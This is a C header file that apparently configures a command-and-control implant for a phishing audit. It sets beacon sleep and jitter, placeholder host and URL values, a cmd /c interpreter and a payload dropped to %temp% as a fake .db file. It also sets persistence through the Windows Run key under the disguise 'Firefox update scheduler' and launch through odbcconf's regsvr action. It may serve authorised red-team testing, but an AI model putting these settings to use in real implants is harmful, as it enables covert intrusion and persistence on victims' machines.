
#ifndef CONFIG_H_
#define CONFIG_H_

const char disclamer[]  = "this binary file has been generated in the purpose of a phishing audit contact: <ENTER CONTACT>";
#define SLEEPTIME       600 //Sleeptime between queries in seconds
#define JITTER          60  //Jitter between queries in seconds

wchar_t HOSTNAME[]      = L"hostanme";
wchar_t URL[]           = L"/URL";
#define INTERPRETER     = "cmd /c";

#define DESTFILE        "%temp%\\R00000000000d.db"
#define INSTALL_DEST    L"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
#define LAUNCH_CMD      "odbcconf /s /a  {regsvr %temp%\\R00000000000d.db}"  //should contains det file
#define KEY_NAME        "Firefox update scheduler"
#define DESKTOP_NAME    "DESKTOP_01"

#endif
